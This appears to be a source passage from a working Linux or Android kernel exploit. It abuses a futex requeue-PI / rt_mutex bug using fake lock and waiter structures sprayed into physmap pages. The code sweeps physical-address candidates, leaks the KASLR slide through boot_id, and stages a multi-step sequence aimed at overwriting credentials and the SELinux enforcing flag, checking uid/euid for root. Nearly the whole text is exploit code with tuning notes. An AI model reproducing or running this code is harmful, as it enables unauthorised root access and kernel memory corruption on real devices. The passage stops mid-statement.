/* ?113.28 stall watchdog: when a handshake stops advancing, dump every thread's
   comm + wchan.  Starvation shows up as "all threads parked, no progress";
   a deadlock shows up as one specific handshake pair frozen.  Turns every
   future hang into evidence instead of a guess. */
static void pr_stall_dump(const char *where, int r) {
  /* ?113.28b: the console is itself a suspect cause of death (console_lock /
     serial-region lockups are known printk hazards), so the post-mortem must
     not travel over it.  Write the dump to a file first, then hint on console. */
  FILE *o = fopen("/tmp/stall.dump", "we");
  if (!o) {
    o = stderr;
  }
  fprintf(o, "STALL at %s r=%d: /proc/self/task/*/wchan dump\n", where, r);
  fflush(o);
  pr_error("STALL at %s r=%d -> /tmp/stall.dump (console may be the casualty)\n",
           where, r);
  DIR *d = opendir("/proc/self/task");
  if (!d) {
    pr_error("  (opendir failed errno=%d)\n", errno);
    return;
  }
  struct dirent *e;
  while ((e = readdir(d)) != NULL) {
    if (e->d_name[0] == '.') {
      continue;
    }
    char p[128], c[64] = "?", w[64] = "?";
    snprintf(p, sizeof(p), "/proc/self/task/%s/comm", e->d_name);
    FILE *f = fopen(p, "re");
    if (f) {
      if (!fgets(c, sizeof(c), f)) c[0] = 0;
      fclose(f);
      size_t n = strlen(c);
      if (n && c[n - 1] == '\n') c[n - 1] = 0;
    }
    snprintf(p, sizeof(p), "/proc/self/task/%s/wchan", e->d_name);
    f = fopen(p, "re");
    if (f) {
      if (!fgets(w, sizeof(w), f)) w[0] = 0;
      fclose(f);
    }
    fprintf(o, "  tid=%s comm=%s wchan=%s\n", e->d_name, c, w);
    fflush(o);
  }
  closedir(d);
  if (o != stderr) {
    fclose(o);
  }
}

int run_persist_stage(int rounds) {  if (rounds > PR_ROUNDS) {
    rounds = PR_ROUNDS;
  }
  uintptr_t value = pselect_write_value();
  uintptr_t target = pselect_write_target();
  if (!target || !value || !fake_lock || !fake_task) {
    pr_error("persist precheck target=%016zx value=%016zx\n", target, value);
    return 0;
  }
  pr_success("persist start rounds=%d target=%016zx value=%016zx "
             "no_restore=%d waiter_word_shift=%d probe_deltas=%d "
             "slide_rounds=%d\n",
             rounds, target, value, g_no_restore, PSELECT_WAITER_WORD_SHIFT,
             pr_probe_deltas, pr_slide_rounds);
  /* §124.28: the file's CREATION (dentry + first blocks) also lives in the page
     cache: a panic before f2fs checkpoints leaves NO file at all (measured: an
     early-death run's vmin4.log did not exist after the reboot).  One early
     fflush+fsync makes the launch coordinates durable from the start; the
     per-round fsync keeps the round trail durable thereafter. */
  fflush(stdout);
  fsync(STDOUT_FILENO);

  /* Block SIGALRM in the driver so pthread_kill() below targets the waiter. */
  sigset_t blk;
  sigemptyset(&blk);
  sigaddset(&blk, SIGALRM);
  pthread_sigmask(SIG_BLOCK, &blk, NULL);

  if (pr_wake[0] < 0 && pipe(pr_wake) != 0) {
    pr_error("persist wake pipe failed errno=%d\n", errno);
    return 0;
  }
  /* §124.17 Option 1: a MAP_SHARED page carries "the redirect round has landed"
     to the rooted victim (a fork sees only COW-private globals). */
  if (pr_cfi_ready == NULL) {
    void *m = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED) {
      pr_error("cfi-ready mmap failed errno=%d\n", errno);
    } else {
      pr_cfi_ready = (volatile int *)m;
    }
  }
  if (pr_cfi_ready != NULL) {
    *pr_cfi_ready = 0;
  }
  int fl = fcntl(pr_wake[0], F_GETFL, 0);
  if (fl >= 0) {
    fcntl(pr_wake[0], F_SETFL, fl | O_NONBLOCK);
  }
  unsigned char boot0[16] = {0};
  direct_read_boot_id_raw(boot0);
  memcpy(pr_boot0, boot0, sizeof(pr_boot0));   /* §115.2 restore oracle */
  snprintf(pr_boot_uuid, sizeof(pr_boot_uuid),  /* §122.11 #2 pre-seq snapshot */
           "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
           boot0[0], boot0[1], boot0[2], boot0[3], boot0[4], boot0[5], boot0[6],
           boot0[7], boot0[8], boot0[9], boot0[10], boot0[11], boot0[12],
           boot0[13], boot0[14], boot0[15]);
  /* ?115.6: PID 1's comm, for the anchor verification (device: "init") */
  {
    pr_anchor_comm[0] = 0;
    FILE *f1 = fopen("/proc/1/comm", "re");
    if (f1) {
      if (fgets(pr_anchor_comm, sizeof(pr_anchor_comm), f1)) {
        size_t n = strlen(pr_anchor_comm);
        if (n && pr_anchor_comm[n - 1] == '\n') {
          pr_anchor_comm[n - 1] = 0;
        }
      }
      fclose(f1);
    }
    pr_success("persist anchor comm (PID 1) = \"%s\"\n", pr_anchor_comm);
  }
  pr_success("persist boot_id before=%02x%02x%02x%02x%02x%02x%02x%02x"
             "%02x%02x%02x%02x%02x%02x%02x%02x\n",
             boot0[0], boot0[1], boot0[2], boot0[3], boot0[4], boot0[5],
             boot0[6], boot0[7], boot0[8], boot0[9], boot0[10], boot0[11],
             boot0[12], boot0[13], boot0[14], boot0[15]);

  pthread_t t_c;
  SYSCHK(pthread_create(&t_c, NULL, pr_consumer, NULL));
  pr_info("persist threads created\n");

  int ok = 0;
  int miss = 0;
  pr_seq_step = pr_seq_start;
  unsigned char *pr_ref = malloc(SKB_SEND_SIZE);
  unsigned char *pr_cur = malloc(SKB_SEND_SIZE);
  if (pr_ref) {
    payload_copy_out(pr_ref, SKB_SEND_SIZE);
  }
  for (int r = 1; r <= rounds; r++) {
    int idx = r - 1;
    atomic_store(&pr_cur_round, r);
    if (g_zero_lock) {
      /* ?113.13: every round's walk poisons the zero slot it used (lock->waiters
         fields + the transient lock word), so each ATTEMPT gets a pristine slot
         of empty_zero_page.  Retries consume slots too.  Running out of slots is
         a clean stop, not a mechanism failure: reboot and rerun. */
      if (idx >= ZERO_LOCK_SLOTS) {
        pr_error("zerolock slot exhaustion (%d slots used) - clean stop; "
                 "reboot and rerun\n", ZERO_LOCK_SLOTS);
        break;
      }
      fake_lock = zerolock_slot(idx);
      pr_success("zerolock slot=%d fake_lock=%016zx\n", idx, (size_t)fake_lock);
    }
    /* ?83 invariant: EVERY round must present a real prio delta.  Drive ALL
       THREE knobs from the SAME counter/parity (pr_cur_round) - using idx for
       one and r for another desyncs the pair and panics. */
    if (pr_cycle_ovl) {
      g_slide_waiter_prio =
          (uint64_t)(FAKE_WAITER_PRIO + (pr_cur_round & 1));
    }
    pr_info("pari round=%d idx=%d slide_prio=%llu nice=%d\n", r, idx,
            (unsigned long long)g_slide_waiter_prio,
            PSELECT_CONSUMER_NICE - (pr_cur_round & 1));
    int slide_now = (idx < pr_slide_rounds);
    if (pr_probe_deltas) {
      /* cycle candidates so the true delta (pr_cands[3]) is hit every 4th
         round; wrong deltas write ~44MB off into real RAM. */
      pr_cand_delta = pr_cands[(r - 1) & 3];
      g_phys_delta = pr_cand_delta;
      uintptr_t cand_target =
          P0_PAGE_OFFSET |
          (SLIDE_RANDOM_BOOT_ID_DATA_IMAGE - KIMAGE_TEXT_BASE + pr_cand_delta);
      set_pselect_write(cand_target, value, 0);
    }
    if (pr_seq && !(pr_sweep && !pr_sweep_hit)) {
      slide_now = pr_seq_plan();
    }
    if (pr_sweep && !pr_sweep_hit) {
      /* ?103: probe grid.  The probe's neutral shape carries no delta-dependent
         field, so only the TARGET expression depends on delta - no page rebuild
         needed for the delta axis; the candidate axis does need the retarget.
         Miss asymmetry: with the delta right a candidate miss just writes a
         pointer into boot_id.data (boot_id reads non-magic content - harmless);
         only a wrong delta writes off into RAM (?80.1: bounded, ~30 such writes
         over a full sweep). */
      /* §124.38: single-pass stop.  If the next entry to arm has passed
         pr_sweep_end (direction-aware), stop cleanly - a finished sweep must
         exit, not wrap into known killers. */
      {
        int cur_n = pr_sweep_d * PR_SWEEP_CANDS + pr_sweep_c;
        int past_end = pr_sweep_dir < 0 ? (cur_n <= pr_sweep_end)
                                        : (pr_sweep_end >= 0 && cur_n > pr_sweep_end);
        if (past_end) {
          pr_success("sweep complete: %s end (cur n=%d end=%d) - clean stop\n",
                     pr_sweep_dir < 0 ? "reverse" : "forward", cur_n, pr_sweep_end);
          break;
        }
        /* §124.54: static skip (fixed-noise killers proven across boots). */
        if (pr_sweep_skipped(cur_n)) {
          pr_success("sweep skip n=%d (fixed noise) - advancing\n", cur_n);
          if (pr_sweep_dir < 0) {
            if (pr_sweep_c <= 0) {
              pr_success("sweep complete: reverse floor (n=0) - clean stop\n");
              break;
            }
            pr_sweep_c--;
          } else {
            pr_sweep_c++;
          }
          continue;
        }
      }
      if (pr_sweep_dir < 0) {
        if (pr_sweep_c <= 0) {
          pr_success("sweep complete: reverse floor (n=0) - clean stop\n");
          break;
        }
      } else if (pr_sweep_c >= PR_SWEEP_CANDS) {
        pr_sweep_c = 0;
        if (++pr_sweep_d >= pr_sweep_ndeltas) {
          pr_sweep_d = 0;
        }
      }
      g_phys_delta = pr_sweep_deltas[pr_sweep_d];
      uintptr_t phys = pr_sweep_phys_pair(pr_sweep_d, pr_sweep_c);
      if (!physmap_retarget(phys)) {
        pr_error("sweep retarget to %016zx failed\n", (size_t)phys);
        break;
      }
      uintptr_t cand_target =
          P0_PAGE_OFFSET |
          (SLIDE_RANDOM_BOOT_ID_DATA_IMAGE - KIMAGE_TEXT_BASE + g_phys_delta);
      /* snapshot the armed entry BEFORE pr_sweep_c++ (see pr_fire_d/c decl) */
      pr_fire_d = pr_sweep_d;
      pr_fire_c = pr_sweep_c;
      if (g_own_probe) {
        /* ?109 delta-free probe: no kernel address is involved at all.  Both the
           landing and the written value live inside the candidate page itself,
           so a wrong candidate can only scribble 8+8 bytes of writable RAM -
           never .text, never an unmapped VA.  The collateral (shape 0 writes
           *(value+8) = target) stays in-page too.  Offsets sit below the payload
           structure region (0x100/0x300/0x700/0x900) so the payload survives. */
        uintptr_t a = dmap_alias();
        pr_own_want = a + 0x40;
        set_pselect_write(a + 0x20, a + 0x40, 0);
        pr_success("ownprobe n=%d d=%d c=%d delta=%016zx phys=%016zx alias=%016zx "
                   "target=%016zx value=%016zx\n",
                   pr_sweep_d * PR_SWEEP_CANDS + pr_sweep_c, pr_sweep_d,
                   pr_sweep_c, (size_t)g_phys_delta, (size_t)phys, (size_t)a,
                   (size_t)(a + 0x20), (size_t)(a + 0x40));
      } else {
      set_pselect_write(cand_target, dmap_alias(), 0);
      pr_success("sweep probe n=%d d=%d c=%d delta=%016zx phys=%016zx alias=%016zx\n",
                 pr_sweep_d * PR_SWEEP_CANDS + pr_sweep_c, pr_sweep_d,
                 pr_sweep_c, (size_t)g_phys_delta, (size_t)phys,
                 (size_t)dmap_alias());
      }
      /* §124.38: direction-aware step (reverse decrements; the floor stop above
         guarantees c>0 here when dir<0). */
      if (pr_sweep_dir < 0) {
        pr_sweep_c--;
      } else {
        pr_sweep_c++;
      }
    }
    pr_slide_this_round = slide_now;
    if (!g_no_restore && !g_zero_lock) {
      /* repair the page exactly like the production path does - with the shape
         matching the round type, and (physmap) WITH re-replication: the walk of
         every deep round poisons the payload page's lock->waiters fields
         (STATUS ?78), and the page the kernel reads is the replicated copy at
         the candidate alias, not our template page 0. */
      if (g_physmap) {
        if (!physmap_retarget_mode(g_pmap_phys_wanted,
                                   slide_now ? PAGE_PAYLOAD_SLIDE
                                             : PAGE_PAYLOAD_FOPS)) {
          pr_error("persist physmap rebuild failed round=%d\n", idx);
          break;
        }
      } else if (!prepare_skb_payload(page_base,
                                      slide_now ? PAGE_PAYLOAD_SLIDE
                                                : PAGE_PAYLOAD_FOPS)) {
        pr_error("persist repair failed round=%d\n", idx);
        break;
      }
    }
    /* §124.77 Q12 restamp landing site (post-rebuild, pre-walk): stamp the
       fake waiter's tree_right (page0 LOCK_OFF+0x10) + replicate to all pages.
       Fires once (flag cleared after). */
    {
      if (pr_restamp_armed && pr_restamp_enable && !g_zero_lock && pmap_buf_addr()) {
        pr_restamp_armed = 0;
        unsigned char *base = (unsigned char *)pmap_buf_addr();
        size_t plen = pmap_buf_len();
        uint64_t tag = 0x5EED000100000000ULL;
        memcpy(base + (size_t)g_lock_off + 0x10, &tag, 8);
        for (size_t o = 4096; o < plen; o += 4096) {
          memcpy(base + o + (size_t)g_lock_off + 0x10, &tag, 8);
        }
        pr_success("restamp tree_right TAG landed (post-rebuild, all pages)\n");
      }
    }
    /* §124.108 Q2 fake-anchor landing (post-rebuild, pre-walk): write rounds
       (pr_wparent=1) need parent := page+0x500 with CONTENT {+0: 0, +8: ->0x510,
       +16: ->0x520}, 0x510/0x520 kept zero (natural).  PERF8 post-mortem: an
       all-zero node SUICIDES - NULL==NULL takes the else branch
       (sibling = parent->rb_left = 0) and the next deref (sibling->rb_left)
       faults on NULL.  With right -> zeroed cell: sibling non-NULL, content 0
       = RED, rotation writes land in-page (safe), then node=parent,
       parent=rb_parent(node)=(+0)=0 -> break.  Termination in 2 iterations,
       zero live chase. */
    {
      if (pr_wparent && !g_zero_lock && pmap_buf_addr() && page_base) {
        unsigned char *base = (unsigned char *)pmap_buf_addr();
        size_t plen = pmap_buf_len();
        uint64_t zero = 0;
        uint64_t rptr = (uint64_t)(page_base + 0x510);
        uint64_t lptr = (uint64_t)(page_base + 0x520);
        memcpy(base + 0x500, &zero, 8);
        memcpy(base + 0x508, &rptr, 8);
        memcpy(base + 0x510, &zero, 8);
        memcpy(base + 0x518, &zero, 8);
        memcpy(base + 0x520, &zero, 8);
        memcpy(base + 0x528, &zero, 8);
        for (size_t o = 4096; o < plen; o += 4096) {
          memcpy(base + o + 0x500, &zero, 8);
          memcpy(base + o + 0x508, &rptr, 8);
          memcpy(base + o + 0x510, &zero, 8);
          memcpy(base + o + 0x518, &zero, 8);
          memcpy(base + o + 0x520, &zero, 8);
          memcpy(base + o + 0x528, &zero, 8);
        }
        pr_success("fake-anchor landed (parent content staged, all pages)\n");
      }
    }
    /* §124.105 perf whole-round skip for step 2: the plan/verify short-circuits
       pass the step, but the round loop would still run the walk (FOPS-residual
       or SLIDE - PERF2/4 proved both die in-walk on residual staging).  Step 2
       is a no-op in perf mode (slide deterministic, re-read skipped), so skip
       the entire round: no spawn, no walk, no collateral.  Step advances to 3
       (comm) directly.
       §124.107: same for step 3 (comm).  PERF5/6 proved comm dies in ANY shape:
       FOPS parent (= comm string as rb node) dies; SLIDE left (= comm string
       chase) dies.  Strings die on either side.  The comm wall's purpose
       (tail-race guard) is moot in perf mode: the tail q derives from a
       deterministic-true slide, the node is the true tasks.prev, and the burst
       parks 8 victims with ours last (B'' semantics).  Accept the race risk,
       skip to cred (step 4).
       §124.117 PERF17-update: same for steps 4/5 (cred walk-writes).  The walk
       NEVER writes B (boot_id.data is a READ window: the kernel reads the
       pointer at B and copies content; __rb_change_child writes parent->left/
       right where parent is the overlay parent, never B).  With parent=fake
       (in-page) the writes land in-page (self-entertainment); with parent=true
       they land in anchor+0/+8 (uts/net fields, harmless).  The cred slots
       were NEVER written by any walk - §124.32's step-6 chain rooted via the
       victim CFI stage (fops redirect -> cfi_stage writes cred+enforcing).
       Skip 4/5 entirely; step 6 (fops trigger) + CFI stage do the real writes. */
    if (pr_seq && !(pr_sweep && !pr_sweep_hit) && perf_slide_requested &&
        perf_slide_done && (pr_seq_step == 2 || pr_seq_step == 3)) {
      pr_seq_step = (pr_seq_step == 2) ? 3 : 4;
      pr_success("perfslide round skip step %d->%d (no walk, no spawn)\n",
                 pr_seq_step == 3 ? 2 : 3, pr_seq_step);
      fflush(stdout);
      fsync(STDOUT_FILENO);
      continue;
    }
    if (pr_seq && !(pr_sweep && !pr_sweep_hit) && perf_slide_requested &&
        perf_slide_done && (pr_seq_step == 4 || pr_seq_step == 5)) {
      pr_seq_step = 6;
      pr_success("perfslide round skip cred step ->6 (walk never writes B)\n");
      fflush(stdout);
      fsync(STDOUT_FILENO);
      continue;
    }
    /* ?103.3 preflight: the alias has exactly one source of truth - the page
       globals set by the last prepare_skb_payload/retarget.  Any divergence
       (e.g. a stale overlay built for a previous candidate) is caught here,
       before an irreversible round, instead of surfacing as BUG_ON(
       w->lock != lock) inside rt_mutex_top_waiter. */
    if (pr_sweep_hit && !pr_preflight_done && !g_zero_lock) {
      pr_preflight_done = 1;
      uintptr_t want_lock = page_base + (uintptr_t)g_lock_off;
      uintptr_t want_w0 = page_base + (uintptr_t)g_w0_off;
      pr_success("preflight page_base=%016zx fake_lock=%016zx(want %016zx) "
                 "fake_w0=%016zx(want %016zx) dmap_alias=%016zx\n",
                 (size_t)page_base, (size_t)fake_lock, (size_t)want_lock,
                 (size_t)fake_w0, (size_t)want_w0, (size_t)dmap_alias());
      if (fake_lock != want_lock || fake_w0 != want_w0 ||
          dmap_alias() != page_base) {
        pr_error("preflight FAILED: alias consumers diverged; aborting before "
                 "the seq\n");
        break;
      }
      /* ?103.4 read the four words the slide walk will consume, straight out of
         the double-mapped payload page (no kernel read primitive needed). */
      pr_success("preflight page words: lock+0x08=%016llx (rb_leftmost, want fake_w0=%016zx) "
                 "lock+0x18=%016llx w0+0x00=%016llx w0+0x30=%016llx w0+0x38=%016llx (want fake_lock=%016zx)\n",
                 (unsigned long long)payload_page_word((uint32_t)(g_lock_off + 0x08)),
                 (size_t)fake_w0,
                 (unsigned long long)payload_page_word((uint32_t)(g_lock_off + 0x18)),
                 (unsigned long long)payload_page_word((uint32_t)(g_w0_off + 0x00)),
                 (unsigned long long)payload_page_word((uint32_t)(g_w0_off + 0x30)),
                 (unsigned long long)payload_page_word((uint32_t)(g_w0_off + 0x38)),
                 (size_t)fake_lock);
    }
    /* ?113.24 (i-b) #2: the pair must be fresh together.  The uaddr side is
       already fresh per round (pr_wait/pr_target/pr_chain[idx], idx = r-1,
       never revisited in this boot) and this spawn gives the matching fresh
       owner task, i.e. a virgin pi_waiters tree for exactly this round. */
    if (pr_waiter_spawn(r) != 0) {
      break;
    }
    if (pr_owner_spawn(r) != 0) {
      break; /* clean abort; the parked owners are left untouched */
    }
    /* ?113.30: only the round whose write READS init_task.tasks.prev needs the
       victim burst (later rounds write to the already-captured pr_seq_task). */
    /* §124.16: only the FULL seq's tail-read step needs the victim burst; the
       cfi mini-seq has no victim (it never writes creds), so fork nothing -
       otherwise 8 parked victims are pure noise for the ps startup probe. */
    pr_victim_rounds =
        (pr_short_seq || pr_seq_cfi || !pr_seq || pr_seq_step != 1) ? 0 : r;
    atomic_store(&pr_waiter_go, r);
    atomic_store(&pr_owner_go, r);
    int waited = 0;
    while (atomic_load(&pr_waiter_ready) != r ||
           atomic_load(&pr_owner_ready) != r) {
      usleep(500);
      if (++waited > 20000) {
        pr_error("persist ready timeout r=%d waiter_ready=%d owner_ready=%d "
                 "stop=%d waiter_tid=%d\n",
                 r, atomic_load(&pr_waiter_ready),
                 atomic_load(&pr_owner_ready), atomic_load(&pr_stop),
                  atomic_load(&pr_waiter_tid));
        /* round BOUNDARY first (i-b): release the owner, let it unlock+park,
           then abort - so no owner is ever left spinning on pr_release. */
        atomic_store(&pr_release, r);
        while (atomic_load(&pr_owner_released) != r &&
               !atomic_load(&pr_stop)) {
          usleep(500);
        }
        break;
      }
    }
    /* §124.40: main-thread heartbeat (raw write, no stdio).  attempt 14's main
       thread vanished between the verify-FAILED line and the `persist round=`
       line with zero trace - a span containing only counters + printf.  Two raw
       marks per round (pre-walk / post-walk) locate any future silent death to
       a sub-round window. */
    {
      char hb[64];
      int hbn = snprintf(hb, sizeof(hb), "[M] r=%d pre-walk step=%d\n", r, pr_seq_step);
      if (hbn > 0) {
        ssize_t hw = write(STDERR_FILENO, hb, (size_t)hbn);
        (void)hw;
      }
    }
    /* §124.36 amend (i): durable pre-line.  The result line (`persist
       round=`) is printed only AFTER the walk returns, so a death INSIDE the
       walk leaves no `landed` row - the killer entry number is lost.  Print
       the firing coordinates BEFORE the walk and fsync them: the last durable
       line of a dying run is then the killer's self-surrender, and the bypass
       list writes itself.  Cost: one fsync per probe (ms on f2fs).
       NOTE: plain printf + explicit fflush/fsync - pr_success does NOT fsync
       on the device build (printf-only path), which is exactly the durability
       asymmetry §124.36 verdict (1) nailed. */
    if (pr_sweep && !pr_sweep_hit) {
      printf("[+] sweep firing round=%d n=%d d=%d c=%d phys=%016zx alias=%016zx\n",
             r, pr_fire_d * PR_SWEEP_CANDS + pr_fire_c, pr_fire_d,
             pr_fire_c, (size_t)g_pmap_phys_wanted, (size_t)dmap_alias());
      fflush(stdout);
      fsync(STDOUT_FILENO);
    } else if (pr_seq) {
      /* §124.60: seq-round durable pre-line.  The result line is durable, but
         a death INSIDE the walk leaves no trace of which step died - the HIT
         deaths (58/59b/62) all stopped between the HIT result line and the
         banner [M].  Fire coordinates before the walk, fsync'd. */
      printf("[+] seq firing round=%d step=%d banner=%d\n",
             r, pr_seq_step, pr_banner_pending);
      fflush(stdout);
      fsync(STDOUT_FILENO);
    }
    errno = 0;
    /* §124.121 seqoverlay: signal the waiter so its SIGUSR1 handler parks
       on the SEQPACKET overlay BEFORE this thread fires the requeue.
       Gate (Q3a, corrected): post-HIT seq rounds only. pr_seq is 1 from
       startup under vcfimin, so it cannot gate sweep-vs-seq; pr_sweep_hit
       (set by sweep HIT or ownprobe HIT relay) is the true seq-entry flag.
       The sentinel (Fake page 0x500) distinguishes post-mortem which
       round the walk read. */
    if (pr_seq) {
      char db[96];
      int dn = snprintf(db, sizeof(db), "[ovlg] step=%d hit=%d en=%d\n",
                        pr_seq_step, pr_sweep_hit, seqoverlay_enabled());
      if (dn > 0) write(STDERR_FILENO, db, (size_t)dn);
    }
    if (seqoverlay_enabled() && pr_seq && pr_sweep_hit) {
      int wtid = atomic_load(&pr_waiter_tid);
      {
        char db[64];
        int dn = snprintf(db, sizeof(db), "[ovlf] wtid=%d step=%d\n", wtid, pr_seq_step);
        if (dn > 0) write(STDERR_FILENO, db, (size_t)dn);
      }
      if (wtid > 0) {
        /* §124.124: withhold the signal until the waiter is inside
           FUTEX_WAIT_REQUEUE_PI (else the handler runs at the wrong stack
           depth and the overlay misses the rt_waiter slot). */
        int g = 0;
        while (atomic_load(&pr_waiter_inwait) != r && g < 3000) {
          usleep(1000);
          g++;
        }
        {
          char db[80];
          int dn = snprintf(db, sizeof(db), "[ovlw] inwait=%d r=%d g=%d\n",
                            atomic_load(&pr_waiter_inwait), r, g);
          if (dn > 0) write(STDERR_FILENO, db, (size_t)dn);
          fsync(STDERR_FILENO);
        }
        syscall(SYS_tgkill, getpid(), wtid, SIGUSR1);
        usleep(200000); /* let the handler land in blocking sendmsg */
      }
    }
    long rq = -99;
    int rq_errno = 0;
    /* §124.123 E1: overlay-without-trigger discriminant. SEQOVL_NO_TRIGGER=1
       skips the requeue walk; overlay + sentinel still fire. Death with no
       walk => foreign PI walk (quiesce helps); survival => own walk is the
       killer (W-discipline helps). */
    {
      const char *e1 = getenv("SEQOVL_NO_TRIGGER");
      if (!(e1 && *e1 && *e1 != '0')) {
        pr_trace("before-requeue", r, 0);
        errno = 0;
        rq = futex_op(&pr_wait[idx], FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                      &pr_target[idx], 0);
        rq_errno = errno;
        pr_trace("after-requeue", rq, rq_errno);
      } else {
        pr_info("E1: trigger withheld (overlay-only round)\n");
      }
    }
    /* §124.40 (cont): post-walk mark. */
    {
      char hb[64];
      int hbn = snprintf(hb, sizeof(hb), "[M] r=%d post-walk rq=%ld e=%d\n",
                         r, rq, rq_errno);
      if (hbn > 0) {
        ssize_t hw = write(STDERR_FILENO, hb, (size_t)hbn);
        (void)hw;
      }
    }
    int is_slide = slide_now;
    { static const char m[]="[M] pw2\n"; write(STDERR_FILENO,m,sizeof(m)-1); }
    if (is_slide) {
      /* arm the bug: interrupt the requeued PI wait so the waiter re-adjusts
         priority from the SIGALRM handler while blocked on the PI mutex */
      if (!pr_skip_sigalrm) {
        usleep(50000);
        int pk = (int)syscall(SYS_tgkill, getpid(),
                              atomic_load(&pr_waiter_tid), SIGALRM);
        pr_info("persist slide pthread_kill ret=%d\n", pk);
      }
    }
    int stall = 0;
    { static const char m[]="[M] pw3\n"; write(STDERR_FILENO,m,sizeof(m)-1); }
    while (atomic_load(&pr_round_done) != r) {
      usleep(1000);
      if (++stall > 30000) {   /* 30 s with no round completion */
        pr_stall_dump("round_done", r);
        break;
      }
    }

    unsigned char raw[16] = {0};
    { static const char m[]="[M] pw4\n"; write(STDERR_FILENO,m,sizeof(m)-1); }
    int got_ok = direct_read_boot_id_raw(raw);
    uint64_t got = 0;
    uint64_t sidecar = 0;
    memcpy(&got, raw, sizeof(got));
    memcpy(&sidecar, raw + 8, sizeof(sidecar));
    int landed;
    { static const char m[]="[M] pw5\n"; write(STDERR_FILENO,m,sizeof(m)-1); }
    if (pr_sweep && !pr_sweep_hit) {
      if (g_own_probe) {
        /* ?109 oracle: purely userspace - look for the self-referential value in
           our own double-mapped spray.  No delta, no kernel read. */
        size_t self_pg = 0;
        if (physmap_find_self(pr_own_want, 0x20, &self_pg)) {
          pr_sweep_hit = 1;
          pr_own_done = 1;
          g_hit_alias = dmap_alias();
          pr_success("OWNPROBE HIT after %d probes: delta=%016zx phys=%016zx "
                     "alias=%016zx self_page=%zu user=%p value=%016zx\n",
                     pr_sweep_d * PR_SWEEP_CANDS + pr_sweep_c,
                     (size_t)g_phys_delta, (size_t)g_pmap_phys_wanted,
                     (size_t)dmap_alias(), self_pg,
                     (void *)((char *)pmap_buf_addr() + (self_pg << 12)),
                     (size_t)pr_own_want);
          landed = 1;
          /* §124.121 ownprobe->seq relay: same entry sequence as a sweep
             HIT (retarget + seq from step 0). The ownprobe walk cannot
             kill (target/value in-page), so this relay is the zero-death
             path into seq — sweep grid bypassed. */
          if (!physmap_retarget(g_pmap_phys_wanted)) {
            pr_error("ownprobe post-hit retarget failed\n");
            atomic_store(&pr_release, r);
            while (atomic_load(&pr_owner_released) != r &&
                   !atomic_load(&pr_stop)) {
              usleep(500);
            }
            break;
          }
          pr_seq = 1;
          pr_seq_step = 0;
          pr_hit_step_pending = 1;
          pr_banner_pending = 1;
          {
            unsigned char *pb = (unsigned char *)pmap_buf_addr();
            if (pb) {
              memcpy(pb, &(uint64_t){POISON_BAIT_U64}, 8);
              pr_baited = 1;
              pr_success("poison bait stamped (head magic -> nonce)\n");
            }
          }
          pr_restamp_armed = 1;
          pr_success("restamp chase-chain probe ARMED (stamp lands post-rebuild)\n");
          if (pr_ref) {
            payload_copy_out(pr_ref, SKB_SEND_SIZE);
          }
        } else {
          landed = 0;
        }
      } else if (got_ok && got == 0x4d41474943000001ULL) {
        pr_sweep_hit = 1;
        g_hit_alias = dmap_alias();   /* freeze the one source of truth */
        pr_success("SWEEP HIT after %d probes: delta=%016zx phys=%016zx alias=%016zx\n",
                   pr_sweep_d * PR_SWEEP_CANDS + pr_sweep_c,
                   (size_t)g_phys_delta, (size_t)g_pmap_phys_wanted,
                   (size_t)dmap_alias());
        /* delta and the payload page are established, but the KASLR slide is
           NOT - it comes only from the slide round, and the read rounds'
           addresses are slide-dependent.  So run the seq from step 0. */
        /* The hit round's own walk has just written its collateral into the
           payload page (STATUS ?78 poison set: lock->waiters* become the overlay
           waiter's kernel-stack address).  Rebuild+re-replicate now, or the very
           first seq round (the slide round - the only one that reaches
           rt_mutex_top_waiter) reads a poisoned rb_leftmost. */
        if (!physmap_retarget(g_pmap_phys_wanted)) {
          pr_error("post-hit retarget failed\n");
          /* round BOUNDARY first (i-b), then abort */
          atomic_store(&pr_release, r);
          while (atomic_load(&pr_owner_released) != r &&
                 !atomic_load(&pr_stop)) {
            usleep(500);
          }
          break;
        }
        pr_seq = 1;
        pr_seq_step = 0;
        pr_hit_step_pending = 1;   /* make the post-round logic keep step 0 */
        pr_banner_pending = 1;     /* §124.52: banner gatekeeper runs first */
        /* §124.52 poison bait: stamp the nonce over the head magic (safe: the
           seq reads fake structures at 0x100+, never the head). */
        {
          unsigned char *pb = (unsigned char *)pmap_buf_addr();
          if (pb) {
            memcpy(pb, &(uint64_t){POISON_BAIT_U64}, 8);
            pr_baited = 1;
            pr_success("poison bait stamped (head magic -> nonce)\n");
          }
        }
        /* §124.77 Q12 restamp chase-chain probe: ARM only here (the per-round
           rebuild below would overwrite a stamp made now).  The stamp lands
           after the rebuild, before the walk (see restamp site at pre-line).
           Attribution rule: if the slide/banner readouts follow the tag
           (change vs pre-restamp baselines), the chase runs through our fake
           chain (controllable); if unchanged, the chase runs through kernel
           live data (self-echo confirmed, readouts independent of fake).
           Safe: tree_right==0 is the §113.24 constructive fact (empty right
           subtree); the tag is non-canonical with low32 zero (NULL-adjacent
           shape preserved). */
        pr_restamp_armed = 1;
        pr_success("restamp chase-chain probe ARMED (stamp lands post-rebuild)\n");
        pr_banner_pending = 1;     /* §124.52: banner gatekeeper runs first */
        if (pr_ref) {
          payload_copy_out(pr_ref, SKB_SEND_SIZE); /* re-baseline after retarget */
        }
        landed = 1;
      } else {
        landed = 0; /* expected; never "exhausted" while sweeping */
      }
    } else if (pr_seq) {
      landed = got_ok && pr_seq_verify(got, sidecar, rq_errno,
                                       atomic_load(&pr_consumer_ok));
    } else if (is_slide) {
      /* a slide round leaks the nfulnl_logger image pointer (§124.43: magnitude
         gate - a bare >>48 check passes sign-extended garbage). */
      landed = got_ok && pr_slide_ok(got);
    } else {
      landed = got_ok && got == 0x4d41474943000001ULL;
    }
    if (landed) {
      ok++;
    } else {
      miss++;
    }
    if (pr_seq) {
      pr_success("seq state step=%d landed=%d uid=%u euid=%u\n",
                 pr_seq_step, landed, getuid(), geteuid());
    }
    pr_success("persist round=%d idx=%d rq=%ld rq_errno=%d calls=%d "
               "consumer_ok=%d got=%016llx sidecar=%016llx landed=%d ok=%d miss=%d%s%zx\n",
               r, idx, rq, rq_errno, atomic_load(&pr_consumer_calls),
               atomic_load(&pr_consumer_ok), (unsigned long long)got,
               (unsigned long long)sidecar, landed,
